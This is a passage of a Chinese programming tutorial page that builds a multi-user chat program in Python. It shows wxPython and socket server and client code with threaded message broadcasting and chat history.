punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'多人聊天系统客户端'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an1,按钮被单击')</span>        server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>  <span class="token comment"># 创建socket对象</span>        server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绑定端口号</span>        server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span>max_connect<span class="token punctuation">)</span>  <span class="token comment"># 开始监听;最大连接2台客户端，超过后排队</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ServerSocket is ready.'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            client<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建客户端连接，每次接收一个连接</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"连接地址：%s"</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">global</span> cnt                <span class="token comment"># 关于历史记录的处理</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>textList<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'No message.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>textList<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 来了一个人加一</span>                <span class="token comment"># 给用户创建新进程</span>                newThread <span class="token operator">=</span> ThreadCreate<span class="token punctuation">(</span>client<span class="token punctuation">)</span>                newThread<span class="token punctuation">.</span>setDaemon<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 设置为守护线程</span>                newThread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开启线程</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!The number of people is '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'an2,按钮被单击'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> wx<span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token punctuation">,</span> localtime<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetimeserver_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 获取本地主机名</span>server_port <span class="token operator">=</span> <span class="token number">8000</span><span class="token comment"># 设置端口</span>max_recedata <span class="token operator">=</span> <span class="token number">2048</span><span class="token comment"># 设置最大接收字节数</span>client_name <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>server_host<span class="token punctuation">)</span>lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 创建锁</span>host_ip <span class="token operator">=</span> <span class="token string">''</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>  <span class="token comment"># 创建socket对象</span><span class="token keyword">class</span> <span class="token class-name">chuangkou</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>liaotian <span class="token operator">=</span> <span class="token number">0</span>        <span class="token comment"># 判断是否取过消息记录</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>chuangkou<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">"多人聊天程序"</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        <span class="token comment"># 创建一个画板</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span>style<span class="token operator">=</span>wx<span class="token punctuation">.</span>TE_PROCESS_ENTER <span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">"请输入服务器的ip地址"</span><span class="token punctuation">)</span>        <span class="token comment"># 创建一个输入服务器ip地址的输入框</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> wx<span class="token punctuation">.</span>ID_ANY<span class="token punctuation">,</span> <span class="token string">"确定"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b_anbdj<span class="token punctuation">)</span>        <span class="token comment"># 创建一个聊天创建的输入框</span>        self<span class="token punctuation">.</span>text <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span>                             style<span class="token operator">=</span>wx<span class="token punctuation">.</span>TE_READONLY <span class="token operator">|</span> wx<span class="token punctuation">.</span>TE_MULTILINE <span class="token operator">|</span> wx<span class="token punctuation">.</span>TE_RICH2 <span class="token operator">|</span> wx<span class="token punctuation">.</span>BORDER_SIMPLE <span class="token operator">|</span> wx<span class="token punctuation">.</span>HSCROLL<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>text<span class="token punctuation">.</span>SetBackgroundColour<span class="token punctuation">(</span><span class="token string">'#d1d1d1'</span><span class="token punctuation">)</span>  <span class="token comment"># 颜色改变为灰</span>        self<span class="token punctuation">.</span>ctrl <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>TE_PROCESS_ENTER <span class="token operator">|</span> wx<span class="token punctuation">.</span>TE_MULTILINE<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token comment"># 创建一个输入发送聊天内容的输入框</span>        self<span class="token punctuation">.</span>sent <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> wx<span class="token punctuation">.</span>ID_ANY<span class="token punctuation">,</span> <span class="token string">"发送"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sent<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sent<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>sent_anbdj<span class="token punctuation">)</span>        box <span class="token operator">=</span> wx<span class="token punctuation">.</span>BoxSizer<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>HORIZONTAL<span class="token punctuation">)</span>  <span class="token comment"># 创建一个垂直布局</span>        box1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>BoxSizer<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>VERTICAL<span class="token punctuation">)</span>  <span class="token comment"># 创建一个平行布局</span>        box1<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span>proportion<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>TOP<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment"># 输入ip地址的输入框的布局</span>        box1<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> proportion<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND <span class="token operator">|</span> wx<span class="token punctuation">.</span>TOP<span class="token punctuation">,</span> border<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment"># 查看聊天记录按钮的布局</span>        box1<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>text<span class="token punctuation">,</span> proportion<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND <span class="token operator">|</span> wx<span class="token punctuation">.</span>TOP<span class="token punctuation">,</span> border<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment"># 接收输入框的布局</span>        box1<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ctrl<span class="token punctuation">,</span> proportion<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND <span class="token operator">|</span> wx<span class="token punctuation">.</span>TOP<span class="token punctuation">,</span> border<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment"># 发送的输入框的布局</span>        box1<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sent<span class="token punctuation">,</span> proportion<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND <span class="token operator">|</span> wx<span class="token punctuation">.</span>TOP<span class="token punctuation">,</span> border<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>a<span class="token punctuation">.</span>SetSizer<span class="token punctuation">(</span>box1<span class="token punctuation">)</span>  <span class="token comment"># 布局设置在a画板上</span>        self<span class="token punctuation">.</span>msg<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">b_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> msg        host_ip<span class="token operator">=</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"链接的服务器地址为"</span><span class="token operator">+</span>host_ip<span class="token punctuation">,</span> <span class="token string">"信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>        client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 连接服务端，指定主机和端口</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"Connecting is successful!"</span><span class="token punctuation">,</span> <span class="token string">"信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>    <span class="token keyword">def</span> <span class="token function">sent_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        send_msg <span class="token operator">=</span> self<span class="token punctuation">.</span>ctrl<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>client_name <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> send_msg<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 接收文字的线程</span>    <span class="token comment"># 由于用户的发送和接收消息是不同步的，在接收消息时线程会阻塞，所以另开启一个线程进行接收文字</span>    <span class="token keyword">def</span> <span class="token function">ThreadReceive</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>text<span class="token punctuation">.</span>AppendText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> wx<span class="token punctuation">.</span>App<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 初始化</span>    shili <span class="token operator">=</span> chuangkou<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建实例</span>    shili<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 显示窗口</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 窗口主循环</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="初级阶段4：线程改版-tkinter使用"><a href="#初级阶段4：线程改版-tkinter使用" class="headerlink" title="初级阶段4：线程改版+tkinter使用"></a>初级阶段4：线程改版+tkinter使用</h2><h3 id="0-5"><a href="#0-5" class="headerlink" title="0.5"></a><strong>0.5</strong></h3><p><strong>作用:换了个线程控制方式</strong></p><blockquote><p>变化：</p><pre class="line-numbers language-none"><code class="language-none">server.listen() #监听server &#x3D; socket.socket() #创建server对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务器端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取当前主机的IP地址</span>port <span class="token operator">=</span> <span class="token number">8000</span> <span class="token comment">#设置防火墙开放端口</span>SocketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储客户端套接字的列表</span>TextList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储聊天记录</span>cnt <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">#当前客户端人数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建server对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#监听</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器准备就绪！'</span><span class="token punctuation">)</span><span class="token comment">#接收一个客户端连接，及其发送来数据</span><span class="token keyword">def</span> <span class="token function">read_client</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#接受客户端发送来的数据</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token comment">#客户端异常，连接失败，则删除该socket</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'已下线！'</span><span class="token punctuation">)</span>        SocketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#多线程：将收到的消息发送给所有客户端</span><span class="token keyword">def</span> <span class="token function">send_client</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> read_client<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token comment">#客户端消息</span>            <span class="token keyword">if</span> content <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span> <span class="token comment">#如果没有结束循环</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment">#如果有将消息保存到历史记录</span>                TextList<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span>content<span class="token punctuation">)</span>            <span class="token comment">#将一个客户端发送过来的数据广播给其他客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'广播未成功！'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    SocketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'已加入！'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#历史消息生成</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>TextList<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'No message.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>TextList<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>        <span class="token comment">#每当有客户连接后，就启动一个线程为其服务</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_client<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token comment">#客户端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadingserver_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>server_port <span class="token operator">=</span> <span class="token number">8000</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span>server_port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#连接服务端，指定主机和端口</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">!=</span> <span class="token string">'No message.'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">'\n------以上是历史消息------\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_server</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token 